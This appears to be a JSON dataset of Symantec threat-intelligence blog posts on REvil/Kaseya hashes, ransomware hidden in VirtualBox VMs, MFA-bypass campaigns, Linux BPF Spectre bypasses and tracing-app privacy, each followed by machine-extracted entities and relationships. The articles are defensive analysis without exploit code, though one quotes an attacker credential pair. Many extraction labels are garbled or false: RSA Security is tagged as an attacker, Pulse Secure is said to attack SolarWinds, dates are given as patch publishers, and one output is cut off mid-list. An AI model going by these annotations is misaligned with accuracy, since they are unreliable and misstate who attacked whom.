dc6b0e8c1e9c113f0364e1c8370060dee3fcbe25b667ddeca7623a95cd21411f  - Dropper aae6e388e774180bc3eb96dad5d5bfefd63d0eb7124d68b6991701936801f1c7  - Dropper 66490c59cb9630b53fa3fa7125b5c9511afde38edab4459065938c1974229ca8  - Dropper 81d0c71f8b282076cd93fb6bb5bfd3932422d033109e2c92572fc49e4abc2471  - Dropper 1fe9b489c25bb23b04d9996e8107671edee69bd6f6def2fe7ece38a0fb35f98e  - Dropper 8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd  - Sodinokibi e2a24ab94f865caeacdf2c3ad015f31f23008ac6db8312c2cbfb32e4a5466ea2  - Sodinokibi d8353cfc5e696d3ae402c7c70565c1e7f31e49bcf74a6e12e5ab044f306b4b20  - Sodinokibi d5ce6f36a06b0dc8ce8e7e2c9a53e66094c2adfc93cfac61dd09efe9ac45a75f  - Sodinokibi cc0cdc6a3d843e22c98170713abf1d6ae06e8b5e34ed06ac3159adafe85e3bd6  - Sodinokibi 0496ca57e387b10dfdac809de8a4e039f68e8d66535d5d19ec76d39f7d0a4402  - Sodinokibi 8e846ed965bbc0270a6f58c5818e039ef2fb78def4d2bf82348ca786ea0cea4f  - Sodinokibi The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (REvil, Malware), (Sodinokibi, Malware), (Kaseya VSA, Tool), (ASCII PEM, File), (agent.crt, File), (Microsoft Defender, Tool)\\nRelationships: (REvil, uses, Sodinokibi), (REvil, delivers, ASCII PEM), (REvil, drops, two)",
      "entities": [
        [
          "REvil",
          "Malware"
        ],
        [
          "Sodinokibi",
          "Malware"
        ],
        [
          "Kaseya VSA",
          "Tool"
        ],
        [
          "ASCII PEM",
          "File"
        ],
        [
          "agent.crt",
          "File"
        ],
        [
          "Microsoft Defender",
          "Tool"
        ],
        [
          "REvil",
          "uses",
          "Sodinokibi"
        ],
        [
          "REvil",
          "delivers",
          "ASCII PEM"
        ],
        [
          "REvil",
          "drops",
          "two"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 9,
    "relationship_count": 0
  },
  {
    "title": "ransomware virtual machines",
    "link": "https://www.security.com/threat-intelligence/ransomware-virtual-machines",
    "content": "Symantec has found evidence that an increasing number of ransomware attackers are using virtual machines (VMs) in order to run their ransomware payloads on compromised computers. The motivation behind the tactic is stealth. In order to avoid raising suspicions or triggering antivirus software, the ransomware payload will “hide” within a VM while encrypting files on the host computer. The tactic is a recent development,having been documented by Sophosin connection with RagnarLocker last year. In that case, ransomware was run from inside an Oracle VirtualBox Windows XP VM. During a recent investigation into an attempted ransomware attack, Symantec discovered that the attackers had installed a VirtualBox VM on some compromised computers. Unlike the previously documented RagnarLocker attacks, which involved Windows XP, the VM in this case appeared to be running Windows 7. The VM was delivered to the target via a malicious installer file that used various file names, including: The installer created a file called runner.exe, which was a Golang (Go) executable compiled from the following source file: Apart from standard Go libraries, it used thego-ps libraryfor process enumeration. Embedded strings used by the executable, such as file names, process names, and commands, were obfuscated using four-byte XOR keys. Each string was encrypted using a unique key. This executable depended on multiple other files that were expected to be present in the same directory. Its main purpose was to install a VirtualBox VM in a headless mode. When executed, runner.exe performed following actions: The executable then dropped, executed, and deleted a file called starter.bat with the following content in order to mount a recovery partition: It then decrypted and dropped VirtualBox.xml, a VirtualBox configuration file, and micro.xml, a VM configuration file (see appendix). It created an SDRSMLINK directory and linked system files to that directory, e.g: It also adjusted the \"<SharedFolders>\" section in micro.xml to reflect files and directories linked in CSIDL_WINDOWS\\SDRSMLINK. It then initialized VirtualBox components: It enumerated and cleared Windows system logs using WEvtUtil.exe: Symantec did not obtain a VM image, but what likely occurred next was that the ransomware payload was located on the VM's disk and auto started once the operating system was fully booted. The VM likely had access to the host computer’s files and directories (via \"SharedFolders\" set up by runner.exe), allowing it to encrypt files on the host computer. While the payload running in the VM was not identified, there were reasonably strong indicators that it was Conti. A username and password combination (nuuser/7HeC00l3stP@ssw0rd) used in these attacks was previously associated with older Conti activity, dating from April 2021. However, on the same computer that the VM was deployed on, Symantec also observed Mount Locker being deployed, raising the question as to whether the payload was actually Mount Locker. Since the main purpose of running a payload on a VM is to avoid detection, it doesn’t make much sense for the attacker to also deploy the payload on the host computer. One possible explanation is that the attacker is an affiliate operator with access to both Conti and Mount Locker. They may have attempted to run a payload (either Conti or Mount Locker) on a virtual machine and, when that didn’t work, opted to run Mount Locker on the host computer instead. Ransomware operators are continually refining their tactics in a bid to stay one step ahead of detection. Many are now heavily relying on legitimate and dual-use tools in order to stage attacks on targeted networks. The ransomware payload itself is often the stage of the attack most likely to raise red flags and, by hiding it in a virtual machine, there is an expectation that it may not be discovered. Organizations should exercise increased vigilance in relation to the unauthorized installation of virtual machines on their networks. For the latest protection updates, please visit theSymantec Protection Bulletin. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (ransomware, Threat Type), (virtual machine, Tool), (Golang, Tool), (Windows XP, OS), (Windows 7, OS), (runner.exe, File), (thego-ps, Tool), (file names, Linked to)\nRelationships: (ransomware, uses, virtual machine), (ransomware, runsOn, compromised computer), (ransomware, hidesWithin, virtual machine), (ransomware, dependsOn, multiple other files), (ransomware, embeddedStrings, obfuscateUsingFourByteXORKeys), (ransomware, createsFileCalledRunnerexe), (ransomware, usesThegoPsLibraryForProcessEnumeration), (ransomware, usesMaliciousInstallerFileThatUsedVariousFileName, runner.exe)",
      "entities": [
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "virtual machine",
          "Tool"
        ],
        [
          "Golang",
          "Tool"
        ],
        [
          "Windows XP",
          "OS"
        ],
        [
          "Windows 7",
          "OS"
        ],
        [
          "runner.exe",
          "File"
        ],
        [
          "thego-ps",
          "Tool"
        ],
        [
          "file names",
          "Linked to"
        ]
      ],
      "relationships": [
        [
          "ransomware",
          "uses",
          "virtual machine"
        ],
        [
          "ransomware",
          "runsOn",
          "compromised computer"
        ],
        [
          "ransomware",
          "hidesWithin",
          "virtual machine"
        ],
        [
          "ransomware",
          "dependsOn",
          "multiple other files"
        ],
        [
          "ransomware",
          "embeddedStrings",
          "obfuscateUsingFourByteXORKeys"
        ],
        [
          "ransomware",
          "createsFileCalledRunnerexe"
        ],
        [
          "ransomware",
          "usesThegoPsLibraryForProcessEnumeration"
        ],
        [
          "ransomware",
          "usesMaliciousInstallerFileThatUsedVariousFileName",
          "runner.exe"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 8
  },
  {
    "title": "targeted ransomware ecosystem",
    "link": "https://www.security.com/threat-intelligence/targeted-ransomware-ecosystem",
    "content": "When it comes to choosing their victims, ransomware attackers have become brutally adept at finding pain points. Their targets range from hospitals, schools, and local government to key infrastructure, such as water treatment and fuel pipelines – and they’re succeeding. Ransomware gangs have aggressively honed their tactics over time while ransomware creators franchise their tools to affiliates in exchange for a cut of the loot. Hardly a day goes by without news of another organization being hit by one of these groups. No longer just a criminal menace, the ransomware scourge now affects society as a whole, reaching a point where it has drawncomparisonsto the challenge the nation faced following the September 11, 2001, terrorist attacks. The time has come to change the dynamic that has developed around ransomware. While ransom payments may be sometimes unavoidable, ransom payment should be a measure of last resort, not the first response. Cyber insurance should be there to compensate victims, not reward attackers. Governments should recognize the key role they can play in assisting victims, both technically and financially. The Conti ransomware attack against Ireland’s national health service, the Health Service Executive (HSE), starkly illustrates the gravity of the threat we now face. In the middle of a global pandemic, attackers crippled its network, causing massive disruption to vital services and forcing it to cancel medical appointments. While the attackers subsequently released a decryption key, they are still attempting to hold the HSE to ransom by threatening to release sensitive patient records stolen during the attack. It would be a mistake to assume that the HSE was an unintentional victim of an indiscriminate campaign. We have no doubt that the attackers knew who they were infecting. It’s hardly a coincidence that the Irish government’s Department of Health was also targeted, albeit less successfully. Crippling the country’s health system appeared to be the end goal. And,as the FBI highlighted last month, attackers using Conti have previously targeted at least 16 healthcare and first responder organizations in the U.S. alone. Attacks such as these can require a high degree of interaction from malware operators, both to successfully deploy the ransomware across the victim’s network and, at the same time, to profile the victim to better estimate the amount of ransom they’re likely to pay based on the success of the attacker’s activity and the quality of the data available for exfiltration. The group behind the HSE attack proceeded with their attack because they knew the disruption it would cause at this key point in the Irish response to the COVID-19 pandemic could lead to a major payoff. Too often, the commentary following a major ransomware attack such as this focuses on the victim, asking whether they had done enough to secure their network. While there is an obvious duty on the part of the victim to make every effort to protect the IT systems and data on which it depends, to solely blame the victim for the attack is overly simplistic and distorts an understanding of the wider issue of why ransomware has become such a stunningly successful criminal enterprise. Aside from the fact that over-zealous public criticism of victims only encourages more victims to quietly capitulate and pay, it also draws attention away from the true perpetrators. The criminals behind targeted ransomware are now among the most technically proficient and well-resourced threat groups operating today. Blockchain analysis company Chainalysisestimated that ransomware gangs netted just under $350 million in 2020, a massive 311% increase over 2019. The scale of ransom payouts now means that the most successful groups will have a bigger operating budget than the victim’s network defenders in all but the largest of organizations. This allows them to operate both at a massive scale and also to persist in their attacks until they’re successful. The Irish government is to be commended for not bowing to pressure and paying a ransom. This is a stance that may be put under increasing pressure in the weeks and months ahead, particularly if the restoration of services proves slow or if sensitive medical data is leaked online. Nevertheless, it is the right decision. It is an unfortunate fact that there will be occasions when some victims will find themselves with no choice other than to pay the ransom. However, we are deeply concerned about how regularly the response to a ransomware attack has begun to resemble a professional transaction—a simple business cost. All too often, ransoms appear to be paid because the cost of the ransom is calculated as being lower than the short-term cost of restoring the victim’s IT systems from backups or because the ransom payment is covered by cyber insurance. These decisions are based on a short-term calculus, ignoring the long-term consequences of continuing to invest in an unhealthy ecosystem where ransomware attackers thrive and multiply. Over the long term, it’s going to do far more good for insurance payouts to go exclusively to the victims to reestablish their operations. This may cost more in the short term and raise costs for insurers and the premiums they charge, but taking a broader view, it’s the only way of cutting off ransomware criminals from the proceeds of their crimes and deterring future ransomware criminality. Governments have become alert to the role they need to play in tackling what is increasingly a societal problem. Much of the focus so far has been on the more obvious role government can play in providing IT security guidance and where necessary, defining security and reporting regulation for critical organizations. However, we suggest a more strategic way of tackling the ransomware threat specifically also needs to be considered. Many organizations, especially small businesses and local government, don’t have the technical resources to quickly recover their operations. To make it easier for ransomware victims to refuse to pay the extortion demands, government should also consider the role it can play in providing not only technical guidance but also supplying direct technical and financial support to these ransomware victims with the aim of getting them back on their feet as soon as possible. The threat of cyber criminals selling or publicizing stolen data is also forcing organizations into paying ransoms and this is increasingly as potent a tool in extorting a ransom as the outright crippling of IT systems, especially for public bodies that have a legal obligation regarding the protection of customer or user data. More can be done to reduce the impact of this type of crime. The Irish Health Service Executive’s response to its ransomware breach suggests a way forward.The HSE secured a legal injunction from the Irish High Court, restraining any sharing, processing, selling, or publishing of the stolen data. While a legal response rarely deters cyber criminals, it does have real value in reducing the likelihood of personal information being shared online or via social media, lessening the pressure on victims to pay extortion money to the ransomware criminals. We can’t pretend that fixing the toxic dynamic around ransomware is going to be easy. It is also clear that things are continuing to get worse and will only get better by combining effective detection and defense against ransomware with an increased focus on reducing the financial attraction of this activity to cyber criminals. As we saw with the addition of stolen data blackmail being added to ransoming IT systems, ransomware gangs have shown themselves adept at finding new techniques to pressure their victims and will certainly redouble their efforts if they encounter resistance. Whatever approach they take can only be defeated by further improving our ability make it harder for ransomware attacks to be successful, while at the same time equal effort needs to be made to reduce or remove entirely the money that feeds the criminals at the center of the ransomware ecosystem. We can put the odds back in our favor by making it harder for ransomware attackers to get away with it. That means more effective detection and defense. At the same time, equal effort needs to be made to reduce – or remove entirely – the money that feeds the criminals at the center of the global ransomware ecosystem. Adam leads a global team of engineers and analysts who develop the game-changing security technologies, attack intelligence, and security content that protects Symantec and Carbon Black customers. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (ransomware, Threat Type), (attackers, Attacker), (Health Service Executive (HSE), Victim), (network, Target), (global pandemic, Event)\nRelationships: (ransomware, uses, attackers), (Health Service Executive (HSE), targets, network)",
      "entities": [
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "attackers",
          "Attacker"
        ],
        [
          "network",
          "Target"
        ],
        [
          "global pandemic",
          "Event"
        ]
      ],
      "relationships": [
        [
          "ransomware",
          "uses",
          "attackers"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 4,
    "relationship_count": 1
  },
  {
    "title": "multi factor authentication new attacks",
    "link": "https://www.security.com/threat-intelligence/multi-factor-authentication-new-attacks",
    "content": "In recent years two-factor or multi-factor authentication (MFA) has been touted as the way to protect your personal and business accounts from attack. This led to the wide adoption of MFA - from corporate accounts to social media profiles, almost all provide the option of enabling MFA, with many requiring it. This means that, for attackers, stealing credentials or brute forcing passwords is no longer enough - if they don’t have access to victims’ multi-factor access token or code they will still not be able to access their accounts. The increasing use of MFA means that attackers have had to endeavor to find ways to bypass it, or avoid carrying out attacks that may be stalled by it. When we look at recent high-profile attacks, such as SolarWinds, the Microsoft Exchange Server ProxyLogon attacks, and the vulnerabilities found in Pulse Secure VPN recently, all these attacks help attackers avoid the hurdle of needing to overcome MFA. While MFA has perhaps only gained wide adoption in the last couple of years, attacks attempting to bypass MFAdate as far back as 2011, when RSA Security was forced to replace 40 million SecurID tokens - which were used for MFA at the time - after the company was hacked. However, recently, there have been some more notable examples of attacks that attempt to either bypass MFA, or eradicate the need to bypass it at all, with five of these outlined in this blog. On April 20, 2021, Pulse Secure published an advisory warning about a zero-day remote code execution vulnerability in its popular VPN product. On the same day,FireEye published a blogdetailing how the vulnerability (CVE-2021-22893) was being exploited by a China-linked APT group it tracks as UNC2630. FireEye said this group was attempting to leverage the vulnerability in attacks targeting defense industrial base (DIB) targets in the U.S. This new vulnerability was exploited, alongside a number of known Pulse Secure vulnerabilities, as the initial infection vector in these attacks. FireEye said that at least 12 malware families have been associated with exploit attempts against vulnerabilities in Pulse Secure. The malware was associated with what appears to be three threat actors, with attacks taking place in organizations in the U.S. and Europe. The UNC2630 activity that was analyzed by FireEye demonstrated that successfully exploiting this vulnerability in the VPN software allowed attackers to Trojanize shared objects with malicious code to log credentials and bypass authentication flows, including multi-factor authentication requirements. FireEye said it was tracking this activity as SlowPulse. The attackers were also able to maintain persistence, inject web shells, and modify files. VPNs became a very popular target for hackers over the last year, as increased working from home due to the pandemic meant that workers were increasingly using VPNs to log into their corporate networks. If an attacker is able to compromise the VPN software - through a vulnerability like this - it negates a need for them to acquire anything more in the line of multi-factor authentication. Apatch for this bug was issued on Monday(May 3), and all users of Pulse Secure should apply it quickly. Symantec has released Hacktool.Webshell and Hacktool.Atrium to block files believed to be related to this vulnerability. On March 2, Microsoft released emergency patches for four zero-day vulnerabilities in Microsoft Exchange Server that were being actively exploited by attackers in the wild. At the time, Microsoft said these vulnerabilities were being exploited by an APT group it dubbed Hafnium (Symantec tracks this group as Ant) in targeted attacks. However, it quickly became apparent that multiple threat actors had started exploiting these vulnerabilities, with numbers rising rapidly once the existence of the vulnerabilities became public knowledge. Two of the vulnerabilities (CVE-2021-26855andCVE-2021-27065) and the technique used to chain them together for exploitation were given the name“ProxyLogon”. Successful exploitation of these vulnerabilities allowed unauthenticated attackers to execute arbitrary code on vulnerable Exchange Servers, allowing them to gain persistent system access, access to files and mailboxes on the server, and access to credentials stored on the system. Successful exploitation may also allow attackers to compromise trust and identity in a vulnerable network. This gives attackers extensive access to infected networks, allowing them to steal potentially highly sensitive information from victim organizations, without the need to bypass any multi-factor authentication steps. In several instances the threat actors using these vulnerabilities were seen stealing emails from victim inboxes. To learn how Symantec helps protect you from these attacks, read our blog:How Symantec Stops Microsoft Exchange Server Attacks The SolarWinds attackswere uncovered in December 2020, and have rarely been out of the headlines since, with theU.S. recently announcingthat it would be imposing sanctions against Russia as a response to the SolarWinds breach, as well as a number of other cyber attacks. The statement from U.S. officials said they had “high confidence” that the SVR, the Russian Foreign Intelligence Service - also known as APT29, Cozy Bear, The Dukes - was responsible for the SolarWinds attack. The SolarWinds incident is believed to have started in around March 2020, with any user of SolarWinds Orion software who downloaded an update between March and December 2020 believed to have become infected with the first-stage malware, Backdoor.Sunburst. The initial infection of victims was indiscriminate, but only a small number of those who downloaded the initial compromised update saw additional malicious activity on their networks. The motivation of the SolarWinds attackers was always believed to be information stealing, with email appearing to be an area of particular interest to them. The attackers were also seen using various techniques to bypass MFA in the course of their attacks. In one incident, security firm Veloxity saidit saw the attackers using a novel technique to bypass 2FAprovided by Duo, though the same technique would likely bypass MFA from any provider that requires integration secrets stored in the potentially compromised environment. After gaining administrator privileges on an infected network, the hackers used those rights to steal a Duo secret known as an “akey” from a server running Outlook Web App (OWA), which enterprises use to provide account authentication for various network services. The hackers then used the “akey” to generate a cookie, so they’d have it ready when someone with the right username and password would need it when taking over an account. In another report,FireEye described the techniques it saw the attackers using. Among the techniques FireEye saw were: Attackers know they need a way to bypass or avoid MFA altogether if they want to access victims’ email accounts, which still appears to be the goal of many sophisticated attackers, including state-sponsored actors like those behind SolarWinds. Read all our SolarWinds research, and how Symantec helps protect you,on our dedicated blog page. In September 2020, Check Point published research on the Rampant Kitten hacking group, whichit said had developed a new Android malware that was capable of intercepting and stealing 2FA codes sent via text. It is known that text 2FA is significantly less secure than using an app or token - as tactics like SIM swapping (where a malicious actor gains access to your phone number) would allow codes to be intercepted - and many security experts think neither organizations nor individuals should be using this kind of 2FA if there is another option. Check Point said Rampant Kitten’s surveillance campaign had been ongoing for as long as six years, targeting dissidents and minorities in Iran. The malware was hidden inside an app that purported to be designed to help Iranian citizens get a Swedish driver's license. However, as well as harvesting contacts, old text messages, and recording using the microphone, the malicious app was also designed to look for SMS messages that contained a \"G-\" string, which is a prefix used by Google as part of the two-factor authentication process. The attackers would send phishing messages to victims in order to harvest their credentials, and would then also be able to access their 2FA codes and gain access to their accounts. The malware also forwarded all text messages to the attackers, meaning they could bypass 2FA for any other apps or services using text message 2FA too. Back in 2019,FOX-IT bloggedabout a Chinese state-sponsored group - APT20 - that wasbypassing 2FA in its attacks. FOX-IT had been monitoring the attacker’s activity over a period of two years, stating that it used living-off-the-land techniques to maintain a stealthy presence on victims’ networks in order to siphon off data for the purposes of espionage. FOX-IT found evidence the attackers had connected to VPN accounts that were protected by 2FA, with the researchers theorizing that they did this by stealing an RSA SecurID software token from a hacked system, which they then used to generate valid one-time codes and bypass 2FA at will. As FOX-IT explained at the time: “The software token is generated for a specific system, but of course this system specific value could easily be retrieved by the actor when having access to the system of the victim. “As it turns out, the actor does not actually need to go through the trouble of obtaining the victim's system specific value, because this specific value is only checked when importing the SecurID Token Seed, and has no relation to the seed used to generate actual two-factor tokens. This means the actor can actually simply patch the check which verifies if the imported soft token was generated for this system, and does not need to bother with stealing the system specific value at all. “In short, all the actor has to do to make use of the two-factor authentication codes is to steal an RSA SecurID Software Token and to patch one instruction, which results in the generation of valid tokens.” While it has been known for some time that some advanced persistent threat (APT) groups and sophisticated actors were able to bypass MFA in some instances, the recent sophisticated attacks that appear to have bypassing these kinds of protections as one of their main goals provides a reminder no single solution is sufficient. Fortunately, these attacks also show MFA is working as attackers need to go to great lengths to find alternative means to breach MFA-protected organizations. Organizations should take additional steps to increase protection, such as: The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (two-factor or multi-factor authentication, Threat Type), (SolarWinds, Incident), (Microsoft Exchange Server ProxyLogon, Incident), (Pulse Secure, Tool), (RSA Security, Attacker), (SecurID tokens, Vulnerability), (zero-day remote code execution, Technique)\nRelationships: (two-factor or multi-factor authentication, isUsedBy, SolarWinds), (two-factor or multi-factor authentication, isUsedBy, Microsoft Exchange Server ProxyLogon), (SolarWinds, isAttackedBy, Pulse Secure), (SolarWinds, isAttackedBy, RSA Security), (Microsoft Exchange Server ProxyLogon, isAttackedBy, Pulse Secure), (Pulse Secure, publishes, advisory), (RSA Security, replaces, SecurID tokens), (SecurID tokens, areUsedFor, two-factor or multi-factor authentication), (zero-day remote code execution, attemptsToBypass, two-factor or multi-factor authentication)",
      "entities": [
        [
          "two-factor or multi-factor authentication",
          "Threat Type"
        ],
        [
          "SolarWinds",
          "Incident"
        ],
        [
          "Microsoft Exchange Server ProxyLogon",
          "Incident"
        ],
        [
          "Pulse Secure",
          "Tool"
        ],
        [
          "RSA Security",
          "Attacker"
        ],
        [
          "SecurID tokens",
          "Vulnerability"
        ],
        [
          "zero-day remote code execution",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "two-factor or multi-factor authentication",
          "isUsedBy",
          "SolarWinds"
        ],
        [
          "two-factor or multi-factor authentication",
          "isUsedBy",
          "Microsoft Exchange Server ProxyLogon"
        ],
        [
          "SolarWinds",
          "isAttackedBy",
          "Pulse Secure"
        ],
        [
          "SolarWinds",
          "isAttackedBy",
          "RSA Security"
        ],
        [
          "Microsoft Exchange Server ProxyLogon",
          "isAttackedBy",
          "Pulse Secure"
        ],
        [
          "Pulse Secure",
          "publishes",
          "advisory"
        ],
        [
          "RSA Security",
          "replaces",
          "SecurID tokens"
        ],
        [
          "SecurID tokens",
          "areUsedFor",
          "two-factor or multi-factor authentication"
        ],
        [
          "zero-day remote code execution",
          "attemptsToBypass",
          "two-factor or multi-factor authentication"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 9
  },
  {
    "title": "spectre bypass linux vulnerabilities",
    "link": "https://www.security.com/threat-intelligence/spectre-bypass-linux-vulnerabilities",
    "content": "Two new vulnerabilities have been patched in the Linux kernel which, if exploited, could bypass existing mitigations for the Spectre vulnerabilities. The vulnerabilities were discovered by Piotr Krysiuk, a researcher on Symantec’s Threat Hunter team, who reported them to the Linux kernel security team. If left unpatched, the vulnerabilities mean that existing Spectre protections will not be sufficient to prevent some exploitation techniques. The vulnerabilities in question are: These bugs affect all Linux machines, but would be particularly impactful on shared resources, as it would allow one malicious user to access data belonging to other users. The patches for these bugs were first published on March 17, 2021, and are included with the Linux kernels released on March 20. Meltdown and Spectre were two chip vulnerabilities discovered in January 2018that affected nearly all modern processors and could only be mitigated through operating system patches. A successful exploit of the vulnerabilities could allow attackers to gain unauthorized access to a computer’s memory, including sensitive information, such as passwords. However, the vulnerabilities were only exploitable if the attacker already had access to the machines – if they were a local user or had gained access with an additional step, such as deploying a remote access Trojan (RAT) on the machine. Spectre exploited flaws in processor designs to reveal contents of memory that should not be normally accessible. It works by observing side effects left by speculative execution, such as when a processor incorrectly predicts results of bounds checks. Variants of Spectre affect virtually all modern processors, including chips from Intel, ARM, and AMD. Meltdown exploited different flaws in processors in order to bypass memory isolation in the operating system. Operating systems are designed in a way to block one application from accessing memory being used by another. If memory isolation fails to work, a malicious application could steal information from memory being used by other applications or users. Because they are chip vulnerabilities, any operating system patches were essentially mitigations designed to make it impossible for an attacker to exploit the vulnerabilities, rather than to address the underlying issue. It is mitigations for Spectre that can be bypassed in Linux using the vulnerabilities outlined in this blog. Both vulnerabilities are related to the Linux kernel support for \"extended Berkeley Packet Filters\" (BPF). BPF allows users to execute user-provided programs directly in the Linux kernel. When loading these programs, the Linux kernel analyzes the program code to ensure they are safe. However, part of this analysis, intended to mitigate Spectre, was not sufficient to protect against some exploitation techniques. Piotr was able to demonstrate two different methods to bypass this protection. These methods are independent as they abuse different issues, and each allows unprivileged local users to extract the contents of the kernel memory. This may include any secrets – passwords, clipboard contents, etc. - from other users on an affected system. The most serious issue is CVE-2020-27170, which can be abused to reveal content from any location within the kernel memory, all of the machine’s RAM, in other words. Unprivileged BPF programs running on affected systems could bypass the Spectre mitigations and execute speculatively out-of-bounds loads with no restrictions. This could then be abused to reveal contents of the memory via side-channels.The identified security gap was that unprivileged BPF programs were allowed to perform pointer arithmetic on particular pointer types, where the ptr_limit was not defined. The Linux kernel did not include any protection against out-of-bounds speculation when performing pointer arithmetic on such pointer types. The second reported issue, CVE-2020-27171, can reveal content from a 4 GB range of kernel memory around some of the structures that are protected. This issue is caused by a numeric error in the Spectre mitigations when protecting pointer arithmetic against out-of-bounds speculations. Unprivileged BPF programs running on affected systems can exploit this error to execute speculatively out-of-bounds loads from a 4 GB range of kernel memory below the protected structure. Like CVE-2020-27170, this can also be abused to reveal contents of kernel memory via side-channels. A detailed technical description of these issues can be found in the following announcements: The most likely scenario where these vulnerabilities could be exploited is in a situation where multiple users have access to a single affected computer – as could be the case in workplace situations etc. In this scenario, any of the unprivileged users could abuse one of the identified vulnerabilities to extract contents of the kernel memory to locate secrets from other users. The bugs could also potentially be exploited if a malicious actor was able to gain access to an exploitable machine via a prior step – such as downloading malware onto the machine to achieve remote access – this could then allow them to exploit these vulnerabilities to gain access to all user profiles on the machine. The patches for these bugs were first published on March 17, 2021 and are included in the following Linux kernel releases: The following Linux distributions have deployed fixes for the vulnerabilities outlined. Find more information at the links below: Version 10.9 (released on March 27, 2021) All users of Linux distributions should check with their vendor to ensure patches have been applied for these vulnerabilities. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Spectre, Vulnerability), (Meltdown, Vulnerability), (Linux kernel, Tool), (Symantec, Company), (Threat Hunter, Team), (Piotr Krysiuk, Individual), (March 17, 2021, Date), (March 20, 2021, Date)\nRelationships: (Spectre, affects, Linux kernel), (Meltdown, affects, Linux kernel), (Piotr Krysiuk, discovers, Spectre), (Symantec, reports, Spectre), (March 17, 2021, publishes, patches), (March 20, 2021, releases, patches), (March 17, 2021, firstPublishedBy, Piotr Krysiuk), (March 20, 2021, firstReleasedBy, Linux kernel security team), (March 17, 2021, firstPublishedOn, Linux kernel), (March 20, 2021, firstReleasedOn, Linux kernel), (March 17, 2021, firstPublishedBy, Linux kernel security team), (March 20, 2021, firstReleasedBy, Linux kernel security team), (March 17, 2021, firstPublishedOn, Linux kernel), (",
      "entities": [
        [
          "Spectre",
          "Vulnerability"
        ],
        [
          "Meltdown",
          "Vulnerability"
        ],
        [
          "Linux kernel",
          "Tool"
        ],
        [
          "Symantec",
          "Company"
        ],
        [
          "Threat Hunter",
          "Team"
        ],
        [
          "Piotr Krysiuk",
          "Individual"
        ],
        [
          "March 17",
          "2021",
          "Date"
        ],
        [
          "March 20",
          "2021",
          "Date"
        ]
      ],
      "relationships": [
        [
          "Spectre",
          "affects",
          "Linux kernel"
        ],
        [
          "Meltdown",
          "affects",
          "Linux kernel"
        ],
        [
          "Piotr Krysiuk",
          "discovers",
          "Spectre"
        ],
        [
          "Symantec",
          "reports",
          "Spectre"
        ],
        [
          "March 17",
          "2021",
          "publishes",
          "patches"
        ],
        [
          "March 20",
          "2021",
          "releases",
          "patches"
        ],
        [
          "March 17",
          "2021",
          "firstPublishedBy",
          "Piotr Krysiuk"
        ],
        [
          "March 20",
          "2021",
          "firstReleasedBy",
          "Linux kernel security team"
        ],
        [
          "March 17",
          "2021",
          "firstPublishedOn",
          "Linux kernel"
        ],
        [
          "March 20",
          "2021",
          "firstReleasedOn",
          "Linux kernel"
        ],
        [
          "March 17",
          "2021",
          "firstPublishedBy",
          "Linux kernel security team"
        ],
        [
          "March 20",
          "2021",
          "firstReleasedBy",
          "Linux kernel security team"
        ],
        [
          "March 17",
          "2021",
          "firstPublishedOn",
          "Linux kernel"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 13
  },
  {
    "title": "security privacy covid tracing apps",
    "link": "https://www.security.com/threat-intelligence/security-privacy-covid-tracing-apps",
    "content": "Unfortunately, in this new COVID-19 era it’s not just our computers we have to protect from infection, but also ourselves and our loved ones. Along with social distancing, wearing a mask, and washing our hands, technology is also playing a part in the fight against the pandemic. COVID-19 contact tracing apps have been deployed by both governments and organizations around the globe. Not all contact tracing apps are equal and an app used by a company to contact-trace its employees while at work can have different objectives than those of an app used by a government to contact-trace its citizens. Any app with tracing functionality should follow best practices when it comes to the collection of data and how that data is stored and used, and there are different rules and regulations relating to this in different parts of the world. This report will analyze 25 popular COVID-19 tracing apps to find out how they do when it comes to security and privacy. However, first, we need to lay out which type of apps we will be looking at and how they work, as well as some of the laws and usage requirements that can shape contact tracing apps. Tracing apps developed and used by governments and ones used by businesses can be for very different use cases. A government app’s intent is to keep track of who a user has been in contact with and to alert users if they have been near a person infected by the virus. An app provided to employees by their employer may be intended to do the same but in a geofenced area, namely the workplace. As well as this it may be needed to trace an infected user’s movements so that the relevant areas can be disinfected. For the purpose of this report we will not be analyzing apps intended for use by employees solely in the workplace and will focus instead on national apps intended for use by the general public. Tracing apps intended for use in the European Economic Area (EEA) must be in compliance with the General Data Protection Regulation (GDPR). GDPR’s stringent privacy and data protection principles offer a comprehensive, functional blueprint for digital system design and, as such, may be viewed as a benchmark to aim for, even for apps in regions of the world that do not have to comply with the regulations. However, because this is often not the case we will first compare the EEA tracing apps, then the non-EEA apps before finally comparing one set to the other. COVID-19 tracing apps use Bluetooth Low Energy (BLE) signals, sent by mobile devices, to keep track of other people and devices the user comes into contact with. If a person they come into contact with tests positive, the app alerts them. Equally, if the user tests positive for COVID-19, the app alerts everyone that they came into contact with. If done properly, COVID-19 tracing apps have the ability to protect and prevent the spread of the Coronavirus. If not done properly, COVID-19 tracing apps have the ability to put users’ privacy and safety at risk. COVID-19 tracing app users should expect to be assigned a randomly generated identifier thatdoes not reveal any personal information about them. 